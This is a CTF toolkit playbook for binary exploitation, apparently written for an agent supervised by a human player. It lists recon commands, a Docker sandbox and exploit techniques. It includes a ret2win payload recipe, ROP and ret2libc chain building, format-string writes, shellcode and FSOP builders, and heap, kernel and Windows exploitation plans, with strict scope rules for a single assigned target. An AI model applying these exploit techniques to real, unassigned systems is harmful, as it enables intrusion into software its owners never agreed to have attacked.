# Playbook: pwn

Binary exploitation. The engines here are **recon / analysis only** — they never run the
binary and never derive a flag. You read their facts, build the exploit yourself, and
**detonate only in Docker** (`csctf-pwn:1`), never on the Mac.

Set this once per shell for any engine run:

```bash
cd <ctf-tools checkout>                   # every command on this page runs from the checkout root
export CTF_EVENT=<event slug>             # the event profile, events/<slug>/event.toml
.venv/bin/python -m ctf workdir --create  # the workdir (ctf.paths): $CTF_WORKDIR, else ~/ctf-work/<event>
```

`workspace/` on this page means that workdir (`.venv/bin/python -m ctf workdir`). Files land in `workspace/<id>-<slug>/files/` (UNTRUSTED). `./csctf pull all` fetches +
triages; `ctf/triage.py` points you here.

---

## 1. First moves (run the moment you open a pwn challenge)

```bash
F=workspace/<id>-<slug>/files/<binary>
.venv/bin/python solvers/toolkits/pwn.py "$F"      # checksec + surface + win/ROP recon
.venv/bin/python solvers/binary/binfmt.py "$F"     # class/arch/entry/dynamic-needed
.venv/bin/python solvers/binary/facts.py "$F"      # toolchain, static-link, UPX, libc hints
```

Then read, in order:
- **Mitigations**: NX, PIE, RELRO, canary, FORTIFY (decides ret2win vs ret2libc vs ROP vs fmt).
- **Dangerous imports / format-string surface** that `pwn.py` flags (`gets`, `strcpy`,
  `read`, `system`, `printf`-family).
- **win/backdoor candidates** (`name@addr`) and whether a **libc** ships with the challenge
  (needed for ret2libc / one_gadget).
- Is there a **live host:port**? If so, exploit dev is local-first in Docker; firing at the
  remote is scope-locked and player-gated (see §5).

---

## 2. Engine CLIs (verified in this repo)

All offline, all static, all `.venv/bin/python`. None executes the target.

### ELF triage / checksec — `solvers/toolkits/pwn.py`
```bash
.venv/bin/python solvers/toolkits/pwn.py "$F"            # human report
.venv/bin/python solvers/toolkits/pwn.py "$F" --json     # machine-readable
```
Prints: ELF class/endian/arch/type/entry; `mitigations: NX PIE RELRO canary fortify`;
`symbols/functions/imports/plt` counts; **dangerous imports**; **format-string surface**;
**win/backdoor candidates** (`name@addr`); and a count + sample of **ROP gadgets** (enumerated,
never executed). The flag is always `None` here — it is recon.

### Header facts — `solvers/binary/binfmt.py`
```bash
.venv/bin/python solvers/binary/binfmt.py "$F"
```
Plain struct read of ELF/PE/Mach-O(+fat)/wasm/DEX headers: bits, machine, `e_entry`, program
& section headers, dynamic `NEEDED` libs, build id. Microseconds; safe on any size.

### Toolchain / runtime marks — `solvers/binary/facts.py`
```bash
.venv/bin/python solvers/binary/facts.py "$F"
```
Tells you what built it: Go/Rust/.NET/PyInstaller/Java/Kotlin/Nim/Zig markers, compiler
`.comment`, and a **UPX** packer signature (unpack in the sandbox, §3). Static-vs-dynamic and
libc hints steer ret2libc.

### Constraint / input recovery — `solvers/toolkits/symbolic.py` (z3)
For "send the exact input that passes the check" gates.
```bash
.venv/bin/python solvers/toolkits/symbolic.py --selftest   # prove the engine works
.venv/bin/python solvers/toolkits/symbolic.py "$F"         # READ cmp immediates (recon)
```
The CLI reads comparison constants out of the disassembly. The **solving** is a small Python
API — lift the comparisons into z3 constraints and it returns the input **only** when z3
proves it unique (never-wrong). See the module docstring for the `import symbolic` snippet.
(There is **no angr** in this venv or in `csctf-pwn:1` — z3 via this module is the symbolic path.)

### Live-target recon helper — `solvers/toolkits/pwn_target.py`
```bash
.venv/bin/python solvers/toolkits/pwn_target.py list        # registered targets (masked)
.venv/bin/python solvers/toolkits/pwn_target.py probes      # the benign recon-probe library
```
Offline helpers only. It connects to **one registered, loopback/private** target and sends
only a probe you pass by hand; it has **no exploit library, fires no payload, submits nothing**.
Any connection is a player stop.

### Library modules (no CLI — imported by triage / called from Python)
- `solvers/binary/static_re.py` — bounded static-RE fallback (disassembles exact symbol-backed
  ELF functions; `eligible(...)` / `answers(questions, files, ctx)`).
- `solvers/binary/native_behavior.py` — bounded whole-image x86-64 emulator for a *described*
  lone integer decoder (`asks(q)`, `answer(q, data)`); returns the value, never runs on host.

---

## 3. Docker: where you actually run / debug

**Rule:** x86-64 challenge binaries run only inside `csctf-pwn:1`. Never `./chal` on the Mac.

Drop into the pwn box (challenge files mounted read-only):
```bash
docker run --rm -it --platform linux/amd64 --network none \
  -v "$PWD/workspace/<id>-<slug>/files":/chal:ro csctf-pwn:1
# heap / ptrace debugging also needs:
#   --cap-add=SYS_PTRACE --security-opt seccomp=unconfined
```
Inside the box you have: **pwntools**, **gdb-multiarch** (+ pwndbg/GEF), **qemu-user**,
**ROPgadget**, **ropper**, **one_gadget**, **patchelf**, `gcc`/`g++`/`nasm`, `ltrace`/`strace`,
`libc6-dbg`. Typical:
```bash
pwn checksec /chal/<bin>
ROPgadget --binary /chal/<bin> | grep ': pop rdi'
ropper -f /chal/<bin> --search 'pop rdi; ret'
one_gadget /chal/libc.so.6
gdb-multiarch /chal/<bin>
# exploit dev: from pwn import *; p = process('/chal/<bin>')   (local, inside the box)
```

Quick static reads can also go through the format sandbox (`csctf-sandbox:2`):
```bash
python3 tools/sandbox.py run --in "$F" rabin2 -I {in}     # checksec-style header
python3 tools/sandbox.py run --in "$F" objdump -d {in}    # disassembly
python3 tools/sandbox.py run --in "$F" strings -n 8 {in}
```
If `facts.py` reported UPX: `python3 tools/sandbox.py run --in "$F" upx -d -o {out}/unpacked {in}`
then re-triage the unpacked file.

---

## 4. Techniques → engines

| Shape | Signal from the engines | How you finish it |
| --- | --- | --- |
| Stack BOF → ret2win | `pwn.py`: `gets`/`read`/`strcpy` + a win candidate `name@addr`; `canary=disabled` | pwntools: pad to saved RIP, jump to the win addr |
| ret2libc | `pwn.py`: dynamic, `system`/GOT/PLT present; libc shipped (`binfmt.py` NEEDED) | leak with puts/GOT, resolve libc, `one_gadget`/`system("/bin/sh")` in the pwn box |
| ROP chain | `pwn.py` gadget count + sample; `NX=enabled`, `PIE=disabled` | `ROPgadget`/`ropper` in `csctf-pwn:1`, build chain in pwntools |
| Format string | `pwn.py` "format-string surface" | `fmtstr_payload` to overwrite GOT / leak canary |
| "enter the key" gate | `symbolic.py` reads the cmp constants | lift to z3, recover the unique input, send it |
| Packed binary | `facts.py` flags UPX | unpack in the sandbox (§3), re-triage |

### 4.1 ret2win recipe (the Chronos staple)

Chronos leans on this every year: a `gets()`/`scanf("%s")`/`read()` into a small stack buffer with
**no canary** and **PIE off**, plus a `win`/`hacked`/backdoor function already in the binary that
either `system("cat flag.txt")`s or prints the flag. 2024 shipped two textbook instances —
**`I returned to win`** (`scanf("%s")` into `char[16]`, overflow 28 bytes → `hacked()` @ `0x08049186`,
32-bit `-no-pie -fno-stack-protector`) and **`Moooooore`** (`gets()` into `rule[50]`, overflow the
adjacent `int enough` guard → the code path that runs `system("cat flag.txt")`). Both were served
through a `socat tcp-listen:9999,...,fork exec:./main` wrapper, so the remote is a bare `nc host port`.

Recognise it from the recon: `pwn.py` reports `canary=disabled`, `PIE=disabled`, a dangerous input
import (`gets`/`__isoc99_scanf`/`read`), and a **win candidate `name@addr`**. Then:

1. **Get the win address.** `pwn.py` prints `win/backdoor candidates` as `name@addr`; or let pwntools
   resolve it at exploit time from the symbol table (`exe.symbols["hacked"]`).
2. **Find the offset to saved RIP/EIP.** Crash the binary *inside* `csctf-pwn:1` with a cyclic pattern
   and read the faulting value back — never on the Mac:
   ```bash
   docker run --rm -it --platform linux/amd64 --network none \
     -v "$PWD/workspace/<id>-<slug>/files":/chal:ro csctf-pwn:1
   # in the box:
   gdb-multiarch /chal/<bin>
   #   (pwndbg) cyclic 200      -> send at the prompt
   #   (pwndbg) run             -> crash; note the faulting EIP/RSP bytes
   #   (pwndbg) cyclic -l 0x6161616c   (32-bit)  /  cyclic -l <8 bytes> (64-bit, n=8)
   ```
   For `I returned to win` the offset is **28** (16-byte buf + saved regs); confirm, don't assume.
3. **Build the payload.** 32-bit: `b"A"*OFFSET + p32(win)`. 64-bit: add a bare `ret` first for the
   movaps 16-byte stack alignment (`p64(ret_gadget) + p64(win)`), then jump to `win`.
4. **Fire it** from the ready template, local-first, then at the assigned remote (§5):
   ```bash
   cp templates/pwn/stack_bof_ret2win.py workspace/<id>-<slug>/solve.py
   # edit BINARY / OFFSET / WIN (or WIN_NAME) / HOST,PORT, then run IN the pwn box:
   docker run --rm -it --platform linux/amd64 --network none \
     -v "$PWD/workspace/<id>-<slug>":/w csctf-pwn:1 python3 /w/solve.py           # local test
   docker run --rm -it --platform linux/amd64 \
     -v "$PWD/workspace/<id>-<slug>":/w csctf-pwn:1 python3 /w/solve.py REMOTE     # assigned target
   ```
   The win function prints `CSCTF{...}` to the tube — read it from `io.interactive()` and submit once
   through the guard (§5). The template (`templates/pwn/stack_bof_ret2win.py`) already has the
   `args.REMOTE` switch, the alignment `ret`, and symbol resolution wired; you only fill the four
   constants. For the `Moooooore` shape there is **no saved-RIP overwrite** — you overflow an adjacent
   *variable* (a flag/guard int), so the "win" is reaching the gated `system(...)` call: pad past the
   buffer to that variable and set it truthy; same template, `WIN`/`OFFSET` become "bytes to the guard".

---

## 5. Get the flag out & submit (scope rules)

1. **Prove it locally** in `csctf-pwn:1` (`process(...)`), confirming you pop a shell / print the flag.
2. **Firing at a live remote is scope-locked and player-gated.** Connect only to the **one host:port
   assigned to our squad** — never the platform, scoreboard, Chronos services, other squads, or an
   unassigned instance. **No flooding, no mass-connect, no submission sweeps** (AGENTS.md fair play).
   `pwn_target.py` never fires an exploit; the exploit connection is yours to run once it's ready.
3. Read the real `csctf{...}` / `chronos{...}` from the service output, then submit **once**:
   ```bash
   ./csctf submit <id> 'csctf{...}' --note 'ret2libc, flag from nc output'
   ```
   or from a solver: `ctf.submit.guarded_submit(ctfd, ch, flag, provenance="ret2libc nc output")`.
   The guard checks the flag format (the event profile's `[flag]` (`events/<slug>/event.toml`, read through `ctf.flagfmt`)), dedupes, paces, skips already-solved,
   and **stops and asks after 3 wrong**. **Never loop candidate flags** — reason to one, submit one.
4. Before working/submitting, `./csctf check <id>` and skip anything a teammate already solved.

## Exploitation kit (added 2026-11-03)

`solvers/toolkits/pwn_exploit.py` builds on the `pwn.py` recon (static, never runs the target):
ROP gadget finding + chain assembly (ret2win / ret2syscall-execve / ret2libc), ret2libc leak planning from a
provided libc, a glibc-correct format-string `%n` write builder, De Bruijn cyclic offset, glibc heap
arithmetic + safe-linking (≥2.32) + a tcache-poison template, and a GOT-overwrite planner. Emits raw bytes
**and** a pwntools snippet.

```
.venv/bin/python solvers/toolkits/pwn_exploit.py ./chall --libc ./libc.so.6 --leak puts=0x7f... --rop execve --gadgets
```

Ready-to-edit pwntools solve scripts: `templates/pwn/{stack_bof_ret2win,ret2libc,format_string,heap_tcache,remote_boilerplate}.py`.
Run/debug the target only inside the `csctf-pwn:1` Docker image (qemu-user + gdb-multiarch), against the
assigned target only. Deterministic chain assembly is strongest on x86/x86-64; non-x86 paths provide
static gadget inventories and architecture-aware skeletons, now including RISC-V. Advanced heap and
kernel/Windows state-machine review plans are described below; live allocator validation remains manual.

## Local libc identification, seccomp filters, and stack pivots

All three additions below are static/offline. They read supplied bytes or build payload bytes; they do
not load a candidate `.so`, run a challenge binary, or connect to a service.

### Match leaked symbols against a local libc set

Give two leaks when possible: their offset difference is much more selective than one leak. The matcher
indexes GNU build IDs and dynamic-symbol offsets, ranks candidates, checks that every leak implies the
same page-aligned base, and resolves `system`, `execve`, `/bin/sh`, `open/openat`, and the other indexed
symbols for the matching candidate.

```bash
.venv/bin/python solvers/toolkits/pwn_exploit.py \
  --identify 'puts=0x7f1234567890,read=0x7f1234571230' \
  --libc-dir workspace/<id>-<slug>/files/libcs --json

# Exact GNU build-id lookup also works without a leak (offsets only; no base yet):
.venv/bin/python solvers/toolkits/pwn_exploit.py \
  --build-id 0123456789abcdef... --libc-dir /path/to/local/libc-set
```

Python API: `identify_libc({"puts": leaked_puts, "read": leaked_read}, libc_dir)`. An inconsistent
candidate stays visibly marked `exact=False` with per-symbol base deltas; the engine never silently
forces it into a match.

### Decode embedded seccomp classic-BPF

```bash
.venv/bin/python solvers/toolkits/pwn_seccomp.py ./chall --arch amd64
.venv/bin/python solvers/toolkits/pwn_seccomp.py ./filter.bpf --arch amd64 --json
.venv/bin/python solvers/toolkits/pwn_seccomp.py ./filter.json --arch aarch64 --json
```

`pwn_seccomp.py` recognizes `seccomp`/`prctl` imports and strings, locates structurally complete
embedded `sock_filter[]` arrays, validates their forward-only CFG, and interprets libseccomp-style BPF
against a bounded named syscall catalog. The report preserves actions such as `errno(1)`, `trap`,
`trace`, and `user_notif`; only `ALLOW`/`LOG` count as allowed. `execve blocked → ORW` means an
`open`/`openat` + `read` + `write` route survived, so plan file-oriented ROP rather than a shell.

### Build a two-stage stack pivot

From Python, after `info, _ = load_elf(path)`:

```python
stage = build_ret2libc(info, system_addr, binsh_addr)
pivot = build_pivot(info, stage_buf=0x404800, chain=stage)
stage1 = pivot.raw
stage2 = bytes.fromhex(pivot.extra["stage2_hex"])
```

The planner prefers exact `pop rsp/esp ; ret`, then accumulator `xchg`, then `pop rbp/ebp ; leave ;
ret`. If none exists it raises `ChainError` listing all missing pivot families. Place `stage2` at the
known writable `stage_buf` with the challenge's existing input primitive, then use `stage1` at the
saved return address. Sending either stage remains a manual, assigned-target-only Docker step.

## Offline shellcode and FSOP builders

`solvers/toolkits/pwn_shellcode.py` builds reviewed byte strings for `execve`, ORW, and an
`mprotect` stager on amd64, i386, ARM, or AArch64. Pass bad bytes with `--avoid`, a syscall allowlist
with `--allowed`, or a saved `pwn_seccomp.py` report with `--seccomp-json`; if `execve` is denied and
ORW is available it chooses the file-read plan. A rejected bad-byte/syscall constraint is an explicit
error, not silently weakened.

```sh
.venv/bin/python solvers/toolkits/pwn_shellcode.py orw amd64 \
  --path /flag --seccomp-json seccomp.json --avoid 00,0a --json
```

`solvers/toolkits/pwn_fsop.py stdout_leak addresses.json --json` and `house_of_apple` emit bounded
`_IO_FILE`/`_wide_data` layouts with a glibc-version profile, relocation list, assumptions, raw bytes,
and a pwntools assembly snippet. Glibc 2.34+ selects the hook-less wide-vtable route. Start from
`templates/pwn/fsop_stdout_leak.py` or `fsop_house_of_apple.py`, then validate offsets against the
matched local libc. Both tools generate artifacts only; execution belongs in the networkless pwn
sandbox and delivery remains manual to the one assigned target.

## Advanced heap, JOP, kernel and Windows plans

`solvers/toolkits/pwn_advanced.py` consumes a bounded JSON configuration and emits only an inert
review plan (plus exact serialized pointer/frame bytes where enough addresses were supplied). Every
result separates `arithmetic_verified` from `exploitability_verified`; the latter is always false until
the player checks the target in the networkless pwn container.

```sh
# heap.json: technique, glibc_version, request_size and explicit leak/target addresses
.venv/bin/python solvers/toolkits/pwn_advanced.py heap heap.json

# jop.json: architecture, dispatcher, table_address, and 1..128 reviewed gadget addresses
.venv/bin/python solvers/toolkits/pwn_advanced.py jop jop.json

# kernel.json: ret2usr/modprobe_path/pt_regs/kaslr_defeat plus explicit mitigations/addresses
.venv/bin/python solvers/toolkits/pwn_advanced.py kernel kernel.json

# windows.json: seh_overwrite/virtualprotect_rop/iat_overwrite/token_steal
.venv/bin/python solvers/toolkits/pwn_advanced.py windows windows.json
```

Heap coverage is version-gated: tcache poison/dup and fastbin dup account for safe-linking; unsorted
leaks subtract only a supplied exact `main_arena`-relative offset and require page alignment; House of
Force declines glibc ≥2.29; classic House of Orange declines >2.23; Einherjar validates backward
distance; the strict Botcake template is limited to 2.29–2.31; House of Apple delegates exact FILE
serialization to `pwn_fsop.py`. Unsupported versions decline instead of returning folklore offsets.

The JOP table serializer covers amd64/i386, ARM/AArch64, MIPS/MIPSel, RISC-V and Win32/Win64
endianness/word widths, but intentionally cannot verify dispatcher clobbers. Kernel plans cover a
two-leak KASLR consistency check, explicitly SMEP/SMAP-disabled amd64 ret2usr frame, inert
`modprobe_path` bytes, and reviewed `pt_regs` templates. Windows plans cover 32-bit SEH records,
VirtualProtect ABI/shadow-space planning, IAT pointer bytes, and build-specific token-steal field
requirements. No Windows structure offset is guessed: an exact build plus every offset is mandatory.

Existing `pwn_exploit.py` already provides real-ELF ret2csu and ret2dlresolve builders and a local
multi-libc matcher, so those are not duplicated here. RISC-V gadget enumeration now joins ARM,
AArch64 and MIPS; as with all non-x86 paths it emits a non-deterministic pwntools skeleton and refuses
to call the skeleton a completed chain.

## SROP / sigreturn-oriented programming

`solvers/toolkits/multiarch_srop.py` builds sigreturn frames and bounded trigger chains for x86-64,
ARM, AArch64, MIPS (BE/LE), and RISC-V — use it when a `sigreturn`/`rt_sigreturn` syscall is reachable
and you can control the stack (classic when `syscall; ret` + a writable stack exist but gadgets are
scarce). It emits the frame bytes + a placement map (caller supplies addresses) and never delivers.
Related dedicated builders (newer than `pwn_advanced.py`): `heap_families.py`, `heap_version_matrix.py`
(glibc 2.23→2.39), `one_gadget.py`, `stack_migration.py`, `kernel_pwn.py`, `windows_pwn.py`,
`gadget_catalog.py`. See `docs/CAPABILITIES.md` → Pwn.
